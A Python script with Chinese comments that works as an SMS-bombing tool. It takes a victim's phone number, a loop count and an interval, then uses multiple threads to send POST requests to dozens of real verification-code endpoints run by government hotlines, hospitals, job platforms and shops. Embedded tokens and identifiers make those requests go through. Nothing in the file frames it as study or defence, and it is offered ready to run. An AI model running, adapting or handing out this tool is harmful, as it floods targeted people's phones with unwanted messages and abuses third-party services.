# 导入必要的库
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import time
import argparse

# 设置日志记录的基本配置
# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 初始化命令行参数解析器
# 命令行参数解析
parser = argparse.ArgumentParser(description="多线程请求脚本")
# 添加命令行参数
parser.add_argument("-p", "--phone", type=str, help="手机号")
parser.add_argument("-f", "--frequency", type=int, help="循环次数")
parser.add_argument("-i", "--interval", type=int, help="间隔时间（秒）", default=60)
parser.add_argument("-inter","--interactive", action="store_true", help="启用交互模式")
args = parser.parse_args()

# 处理交互模式输入
# 处理交互模式
if args.interactive:
    phone = input("请输入手机号：")
    frequency = input("循环次数:")
    interval = input("设置间隔时间（秒，默认 60 秒）: ")

    try:
        frequency = int(frequency)
    except ValueError:
        print("循环次数无效，请输入一个整数！")
        exit()

    try:
        interval = int(interval) if interval else 60
    except ValueError:
        print("间隔时间无效，请输入一个整数！")
        exit()
else:
    # 确保在非交互模式下提供了必要的参数
    if not args.phone or not args.frequency:
        parser.error("--phone 和 --frequency 参数是必需的，除非启用交互模式 (--interactive)")

    phone = args.phone
    frequency = args.frequency
    interval = args.interval

# 打印请求配置的概要信息
print("共142个接口")
print("--------------------------------")
print(f"手机号: {phone}")
print(f"循环次数: {frequency}")
print(f"间隔时间: {interval} 秒")

# 定义请求配置列表，包含多个URL及其对应的请求数据
# 定义请求URL和参数
requests_config = [
    {"url": "https://miniapps.nj12345.net/wechatsmallprogram/rest/checkcode/getCheckCode",
     "data": {"token": "Epoint_WebSerivce_**##0601", "params": {"mobile": phone}}},
    {"url": "https://passport.xag.cn/home/sms_code", "data": {"icc": "86", "phone": phone}},
    {"url": "https://www.luzhou12345.cn/app12345wbs.asmx/getInfo",
     "data": {"AcceptType": "sendwritevercode", "AcceptContent": f'{{"Mobile":"{phone}"}}'}},
    {"url": "https://12345xcx.shaanxi.gov.cn/xcxrest/rest/applets/onlineUser/getUnloginMsgCode",
     "data": {"token": "Epoint_WebSerivce_**##0601", "params": {"userMobile": phone, "validateCodeType": "01"}}},
    {"url": "https://www.tbeatcny.cn:10015/zhwl/api/sjzj/verificationCode", "data": {"username": phone}},
    {"url": "https://wxpay-web.yixincapital.com/wxpay-web/minBasis/verificationCode",
     "data": {"openId": "IzaKfsCaIjNAhbSJ8mTaJSWPbQJDKW1IidEbQoPPIYE%3D", "phone": phone}},
    {"url": "https://qyzwfw.cn/cns-bmfw-webrest/rest/mobileUser/getCheckCode",
     "data": {"token": "Epoint_WebSerivce_**##0601", "params": {"mobile": phone}}},
    {"url": "https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode",
     "data": {"token": "Epoint_WebSerivce_**##0601", "params": {"phoneNumber": phone}}},
    {"url": "https://www.xysxzspj.com/index/Server/send_code.html", "data": {"phone": phone}},
    {"url": "https://b.aifabu.com/v1/setSmsCode", "data": {"phone": phone, "type": 1}},
    {"url": "https://userapi.heaye.shop/api/auth/sendSms", "data": {"phone": phone}},
    {
        "url": "https://www.mytijian.com/main/action/mobileValidationCode?_site=hnszsy&_siteType=mobile&_p=&clientVersion=v1.1.6",
        "data": {"scene": "6", "mobile": phone}},
    {"url": "https://health.gz12hospital.cn:6603/smartpe-busi-service/app/captcha",
     "data": {"archiveCode": "440130", "mobile": phone}},
    {"url": "https://a.welife001.com/applet/sendVerifyCode", "data": {"phone": phone}},
    {"url": "https://mc.tengmed.com/formaltrpcapi/patient_manager/sendPhoneVerifyCode", "data": {
        "request": {"commonIn": {"requestId": "5cbc9535-fbe7-4f39-8902-37bf8ef68889", "channel": ""}, "phone": phone}}},
    {"url": "https://ls.xzrcfw.com/App/Sys/SendPhoneCode",
     "data": {"requestModel": {"phone": phone, "OptionType": 1, "Role": 2}, "Token": None, "Source": "MiniProject",
              "Platform": 2, "isTibetan": False}},
    {"url": "https://qjpt.dypmw.com/api/xilujob.sms/send", "data": {"mobile": phone}},
    {"url": "https://www.hnzgfwpt.cn/ums-wechat/sms/send-code",
     "data": {"unionid": "oLhND6juFSLTyPDtojyUxFrpZQuQ", "mobile": phone, "msgPrefix": "【河南新就业工会】"}},
    {"url": "https://applets.qinyunjiuye.cn/sxzhjy_h5/tel/telmessage/save", "data": {"telephone": phone}},
    {"url": "https://edu.jsgpa.com/admin/apis/user/api/user/send/code", "data": {"phone": phone, "type": 1}},
    {"url": "https://eibp-api.ynjspx.cn/before/captcha/smsCode", "data": {"phone": phone}},
    {"url": "https://yuanzhijiekeji.cn/api.html", "data": {"mobile": phone, "code": "reg", "method": "user.sms"}},
    {"url": "https://826625173.ehpp.club/weapp/customer/getCheckNo", "data": {"phone": phone}},
    {"url": "https://media.hzj7.com/index.php/App800/Login/phone_code", "data": {"phone": phone}},
    {"url": "https://shop.zdjt.com/api.html", "data": {"mobile": phone, "code": "bind", "method": "user.sms"}},
    {"url": "https://smart.shuye.com/api/sms/send", "data": {"mobile": phone, "event": "login"}},
    # {"url": "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/", "params": {'phone': phone,'type': '2'}},
    {"url": "https://weixin-nj.pcmh.com.cn/sms-gateway/aliyun/identity-verification?organization-id=11510901345812856P",
     "data": {"mobile": phone}},
    {"url": "https://www.hylyljk.com/ymm-common/sms/sendSmsCode",
     "data": {"phone": phone, "MethodWay": 1, "Product": 1}},
    {"url": "https://api.zyydjk.net/message/public/sendSms", "data": {"phone": phone, "MethodWay": 1, "Product": 1}},
    {"url": "https://m.ylzhaopin.com/Wxapi/Account/getverify", "data": {"tel": phone}},
    {"url": "https://mapi.jialongjk.com/api/user/verify/mobile/code",
     "data": {"from": "dynamic_login", "mobile": phone}},
    {"url": "https://product.yl1001.com/api-yp/register/sendSmsCode", "data": {"mobile": phone}},
    {"url": "https://superdesk.avic-s.com/super_cloud/api/wechat/front/smsCode",
     "data": {'mobile': phone, 'orgId': -1, 'type': 0}},
    {"url": "https://wx-prm.bshcn.com.cn/*.jsonRequest", "data": ["hcn.sh-pdxqrmyy.patient_mini", phone]},
    {"url": "https://user.zjzwfw.gov.cn/nuc/reg/sendSmsCode", "data": {"phone": phone}},
    {"url": "https://96885wx.hrss.jl.gov.cn/minifast/frontRestService/frontBcpDataRestService/getBcpData",
     "data": {"methodName": "JRZX_093", "loginNo": phone, "loginType": "10", "yae100": "12", "siteToken": ""}},
    {"url": "https://m.52xiaoyuan.cn/mapp/getMappSmsCode", "data": {"mobile": phone, "module": "xykt_gctc"}},
    {
        "url": "'https://sqsz.shiyan.gov.cn/smartCommunity/appsend/sendCode?time=1711225888672&sign=516256e7e7ae11f7ac9a51eb6c4e0da4",
        "data": {"data_value": phone, "flag": 0, "send_type": 1, "communityId": 6, "roleId": 2, "user_id": 246756}},
    {"url": "https://ehr-recruitment.yifengx.com/restful/login/sendMessage", "data": {"phone": phone}},
    {"url": "https://yf.yifengyunche.com/admin/yfycapp/get_sms/secret/f68a6f6e071090621458faeed3cbc7812",
     "data": {"phone": phone, "sms_type": "xcx_login", "uuid": "oguyl5B1fCGz-AgAXyi1DEhCykPE"}},
    {"url": "https://account.xiaomi.com/pass/sns/wxapp/v2/sendTicket", "data": {"phone": phone, "sid": "micar_wxlite"}},
    {"url": "https://api.kq36.com/public/returnhtm/return_uni-app.asp?cmd=login_user_phone",
     "data": {"mobile": phone, "typen": "login", "uid": "oZqPrs4_EwbdKo5yZsiQhzPr29iA"}},
    {"url": "https://newretail2.xianfengsg.com/newretail/api/sms/sendSms", "data": {"mobile": phone}},
    {"url": "https://xiaoshou.lujiandairy.com/api/wx/send/mobile/bind_mobile", "data": {"mobile": phone}},
    {"url": "https://api.kucee.com/website.Access/getPhoneCode",
     "data": {"phone": phone, "type": 1, "lat": 12435, "lng": 8946, "storeId": 0, "appId": "wx942a1bf556jsnsb",
              "scene": 1053, }},
    {"url": "https://api.jmfww.com/api/Common/GetMobileCode", "data": {"mobile": phone, "type": 2}},
    {"url": "https://ehospital-members.sq580.com/v1_0/ehospital/app/common/sendVerifyCode", "data": {"phone": phone}},
    {"url": "https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode", "data": {"transType": "",
                                                                                   "param": {
                                                                                       "phone": phone,
                                                                                       "codeType": "LOGIN",
                                                                                       "miniOpenId": "o41bz5Tif8yAhus3xP5M4ypm3N0c",
                                                                                   },
                                                                                   "pageParam": {},
                                                                                   "serviceId": "",
                                                                                   "appId": "8a8a87106b72a440016b72bf44a10000",
                                                                                   "deviceId": "04daccefc14033ed3d18f157a9f6d1d8",
                                                                                   "signType": "MD5",
                                                                                   "termType": "WX_MINI",
                                                                                   "version": "1.0.0",
                                                                                   "appVersion": "1.0.0",
                                                                                   "termId": "1234",
                                                                                   "alg": "AES",
                                                                                   "sign": "rasfs2334214fasf",
                                                                                   "timestamp": "1711476594145",
                                                                                   "platId": "T2023041400000000001",
                                                                                   "isEncrypt": 0,
                                                                                   "sessionId": "", }},
]

# 定义一个函数来发送POST请求并处理响应
def make_request(config):
    """
    发送HTTP POST请求并处理响应。

    :param config: 包含请求URL和数据的字典。
    :return: 请求成功时返回响应文本，否则返回None。
    """
    try:
        # 发送POST请求
        response = requests.post(config["url"], json=config["data"])
        # 检查请求是否成功
        response.raise_for_status()
        # 记录请求成功的日志
        logging.info(f"请求成功: {config['url']} - {response.status_code}")
        return response.text
    except requests.exceptions.RequestException as e:
        # 记录请求失败的日志
        logging.error(f"请求失败: {config['url']} - {e}")
        return None

# 定义一个函数来执行多线程请求
def 多线程():
    """
    使用线程池执行多个请求。
    """
    # 创建一个线程池
    with ThreadPoolExecutor() as executor:
        # 提交所有请求并获取Future对象
        futures = [executor.submit(make_request, config) for config in requests_config]
        # 遍历所有Future对象，获取请求结果
        for future in as_completed(futures):
            result = future.result()
            if result:
                # 记录响应内容的日志
                logging.info(f"响应内容: {result}")
            # 按照设定的间隔时间休眠
            time.sleep(interval)

# 主程序入口
if __name__ == '__main__':
    # 循环执行请求
    for i in range(frequency):
        # 记录循环开始的日志
        logging.info(f"开始第 {i + 1} 轮请求")
        # 执行多线程请求
        多线程()
        # 记录循环结束的日志
        logging.info(f"第 {i + 1} 轮请求结束")